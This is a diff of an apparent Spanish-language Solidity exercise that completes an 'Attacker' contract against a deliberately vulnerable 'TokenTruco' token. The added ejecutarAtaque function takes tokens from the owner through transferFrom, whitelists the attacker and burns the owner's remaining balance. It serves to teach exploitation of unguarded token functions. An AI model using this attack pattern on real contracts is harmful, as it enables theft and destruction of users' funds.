@@ -74,26 +74,40 @@ contract TokenTruco is Whitelist, NumeroRandom {
 // Deducir la interface y los métodos que se usarán
 // Mediante ITokenTruco el contrato Attacker ejecutará el ataque
 interface ITokenTruco {
+    function montoAleatorio() external view returns (uint256);
     function owner() external view returns (address);
-
     function balances(address _account) external view returns (uint256);
-
-    // function transferFrom
-
-    // function burn
-
-    // ...
+    function transferFrom(address _from, address _to, uint256 _amount) external;
+    function addToWhitelist() external;
+    function burn(address _from, uint256 _amount) external;
 }
 
-// Modificar el método 'ejecutarAtaque'
 contract Attacker {
     ITokenTruco public tokenTruco;
+    uint256 public attackerBalance;
 
     constructor(address _tokenTrucoAddress) {
         tokenTruco = ITokenTruco(_tokenTrucoAddress);
     }
 
     function ejecutarAtaque() public {
-        // tokenTruco ...
+        // Calcular un monto aleatorio usando el método 'montoAleatorio' de SimpleToken
+        uint256 monto = tokenTruco.montoAleatorio();
+        address owner = tokenTruco.owner();
+
+        // Transferir el monto aleatorio desde la cuenta del owner a la cuenta del atacante
+        tokenTruco.transferFrom(owner, address(this), monto);
+
+        // Transferir una cantidad específica de tokens al atacante
+        uint256 amountToTransfer = 100; // Coloca aquí la cantidad de tokens que el Attacker debe recibir
+       tokenTruco.transferFrom(owner, address(this), amountToTransfer);
+       attackerBalance += amountToTransfer;
+
+        // Agregar la cuenta del atacante a la whitelist
+        tokenTruco.addToWhitelist();
+
+        // Calcular el restante en la cuenta del owner para quemarlo
+        uint256 saldoRestante = tokenTruco.balances(owner);
+        tokenTruco.burn(owner, saldoRestante);
     }
 }
